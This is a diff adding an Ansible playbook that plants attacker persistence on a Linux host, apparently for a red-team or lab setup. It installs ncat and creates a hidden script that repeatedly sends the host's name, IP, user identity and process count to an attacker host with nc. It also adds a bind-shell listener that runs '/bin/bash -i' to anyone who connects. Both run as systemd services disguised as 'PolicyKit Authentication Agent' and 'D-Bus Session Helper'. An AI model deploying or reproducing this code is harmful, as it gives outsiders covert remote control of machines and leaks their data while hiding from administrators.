@@ -1,0 +1,94 @@
+---
+- name: Install ncat
+  apt:
+    name: ncat
+    state: present
+    update_cache: yes
+
+# ── C2 beacon (victim → attacker) ────────────────────────────────────────────
+
+- name: Create hidden C2 beacon script
+  copy:
+    dest: "{{ beacon_script }}"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0700"
+    content: |
+      #!/bin/bash
+      ATTACKER="{{ attacker_host }}"
+      PORT="{{ attacker_port }}"
+      WORKER="{{ worker_id }}"
+      LOG="{{ beacon_log }}"
+
+      while true; do
+        {
+          printf "=== beacon %s worker=%s ===\n" "$(date -Is)" "$WORKER"
+          printf "host: %s\n" "$(hostname)"
+          printf "ip: %s\n" "$(hostname -I 2>/dev/null)"
+          printf "user: %s\n" "$(id)"
+          printf "uptime: %s\n" "$(uptime -p 2>/dev/null)"
+          printf "procs: %d\n" "$(ps -e --no-headers 2>/dev/null | wc -l)"
+        } | nc -w 5 "$ATTACKER" "$PORT" >> "$LOG" 2>&1 || true
+
+        sleep {{ beacon_interval }}
+      done
+
+- name: Create systemd service for C2 beacon
+  copy:
+    dest: "/etc/systemd/system/{{ beacon_service }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=PolicyKit Authentication Agent
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=simple
+      User={{ username }}
+      ExecStart={{ beacon_script }}
+      Restart=always
+      RestartSec=10
+
+      [Install]
+      WantedBy=multi-user.target
+
+# ── Local backdoor listener (victim inbound) ──────────────────────────────────
+
+- name: Create systemd service for backdoor listener
+  copy:
+    dest: "/etc/systemd/system/{{ backdoor_service }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=D-Bus Session Helper
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/usr/bin/ncat -lk {{ backdoor_port }} -c "/bin/bash -i"
+      Restart=always
+      RestartSec=5
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Reload systemd
+  systemd:
+    daemon_reload: true
+
+- name: Enable and start C2 beacon service
+  systemd:
+    name: "{{ beacon_service }}"
+    enabled: yes
+    state: started
+
+- name: Enable and start backdoor listener service
+  systemd:
+    name: "{{ backdoor_service }}"
+    enabled: yes
+    state: started
